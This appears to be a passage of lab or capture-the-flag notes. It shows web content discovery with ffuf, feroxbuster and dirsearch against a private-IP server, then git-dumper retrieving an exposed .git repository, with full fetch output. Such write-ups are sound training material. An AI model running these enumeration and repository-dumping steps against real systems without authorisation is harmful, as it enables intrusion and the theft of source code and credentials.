```
ffuf -u http://10.49.181.208:8080/FUZZ \
-w /usr/share/seclists/Discovery/Web-Content/common.txt \
-fc 404
```
```
feroxbuster \
-u http://10.49.181.208:8080 \
-x php,html,js,json,txt \
-r
```
<img width="1972" height="1192" alt="image" src="https://github.com/user-attachments/assets/a8832bd9-7104-40f5-9879-5bcba340a0da" />

```
dirsearch -u http://10.49.181.208:8080/ -e php,txt,html,js
```
<img width="2032" height="1222" alt="image" src="https://github.com/user-attachments/assets/5a47e01d-79a7-4d29-af2b-233cf155e4f6" />
<img width="1190" height="478" alt="image" src="https://github.com/user-attachments/assets/f40a640b-7715-4e76-beb2-4d56c8530b29" />

```
git-dumper http://10.49.181.208:8080/.git repo

[-] Testing http://10.49.181.208:8080/.git/HEAD [200]
[-] Testing http://10.49.181.208:8080/.git/ [200]
[-] Fetching .git recursively
[-] Fetching http://10.49.181.208:8080/.git/ [200]
[-] Fetching http://10.49.181.208:8080/.gitignore [404]
[-] http://10.49.181.208:8080/.gitignore responded with status code 404
[-] Fetching http://10.49.181.208:8080/.git/logs/ [200]
[-] Fetching http://10.49.181.208:8080/.git/hooks/ [200]
[-] Fetching http://10.49.181.208:8080/.git/index [200]
[-] Fetching http://10.49.181.208:8080/.git/HEAD [200]
[-] Fetching http://10.49.181.208:8080/.git/objects/ [200]
[-] Fetching http://10.49.181.208:8080/.git/COMMIT_EDITMSG [200]
[-] Fetching http://10.49.181.208:8080/.git/config [200]
[-] Fetching http://10.49.181.208:8080/.git/branches/ [200]
[-] Fetching http://10.49.181.208:8080/.git/info/ [200]
[-] Fetching http://10.49.181.208:8080/.git/description [200]
[-] Fetching http://10.49.181.208:8080/.git/objects/pack/ [200]
[-] Fetching http://10.49.181.208:8080/.git/objects/0a/ [200]
[-] Fetching http://10.49.181.208:8080/.git/objects/fa/ [200]
[-] Fetching http://10.49.181.208:8080/.git/objects/info/ [200]
[-] Fetching http://10.49.181.208:8080/.git/objects/0f/ [200]
[-] Fetching http://10.49.181.208:8080/.git/refs/ [200]
[-] Fetching http://10.49.181.208:8080/.git/logs/HEAD [200]
[-] Fetching http://10.49.181.208:8080/.git/logs/refs/ [200]
[-] Fetching http://10.49.181.208:8080/.git/objects/25/ [200]
[-] Fetching http://10.49.181.208:8080/.git/objects/a5/ [200]
[-] Fetching http://10.49.181.208:8080/.git/hooks/commit-msg.sample [200]
[-] Fetching http://10.49.181.208:8080/.git/hooks/post-update.sample [200]
[-] Fetching http://10.49.181.208:8080/.git/hooks/fsmonitor-watchman.sample [200]
[-] Fetching http://10.49.181.208:8080/.git/hooks/applypatch-msg.sample [200]
[-] Fetching http://10.49.181.208:8080/.git/hooks/pre-commit.sample [200]
[-] Fetching http://10.49.181.208:8080/.git/hooks/pre-merge-commit.sample [200]
[-] Fetching http://10.49.181.208:8080/.git/hooks/pre-applypatch.sample [200]
[-] Fetching http://10.49.181.208:8080/.git/hooks/pre-push.sample [200]
[-] Fetching http://10.49.181.208:8080/.git/hooks/pre-receive.sample [200]
[-] Fetching http://10.49.181.208:8080/.git/hooks/pre-rebase.sample [200]
[-] Fetching http://10.49.181.208:8080/.git/info/exclude [200]
[-] Fetching http://10.49.181.208:8080/.git/objects/a5/965c580fee91d852e5b19a8290da02d2926523 [200]
[-] Fetching http://10.49.181.208:8080/.git/hooks/push-to-checkout.sample [200]
[-] Fetching http://10.49.181.208:8080/.git/hooks/update.sample [200]
[-] Fetching http://10.49.181.208:8080/.git/objects/25/75ab073f67615a27135663ed36794c2d2584fb [200]
[-] Fetching http://10.49.181.208:8080/.git/hooks/prepare-commit-msg.sample [200]
[-] Fetching http://10.49.181.208:8080/.git/hooks/sendemail-validate.sample [200]
[-] Fetching http://10.49.181.208:8080/.git/refs/heads/ [200]
[-] Fetching http://10.49.181.208:8080/.git/refs/tags/ [200]
[-] Fetching http://10.49.181.208:8080/.git/objects/0a/12caa4e52a965e89e5eccf5760924b21aacbf7 [200]
[-] Fetching http://10.49.181.208:8080/.git/objects/fa/45dbd69394ea9e13683d9efb6a0220daac59d4 [200]
[-] Fetching http://10.49.181.208:8080/.git/logs/refs/heads/ [200]
[-] Fetching http://10.49.181.208:8080/.git/refs/heads/main [200]
[-] Fetching http://10.49.181.208:8080/.git/objects/0f/13550b4cb13e9f30c61d5b342c532d21e45bda [200]
[-] Fetching http://10.49.181.208:8080/.git/logs/refs/heads/main [200]
[-] Sanitizing .git/config
[-] Running git checkout .
Updated 3 paths from the index
```
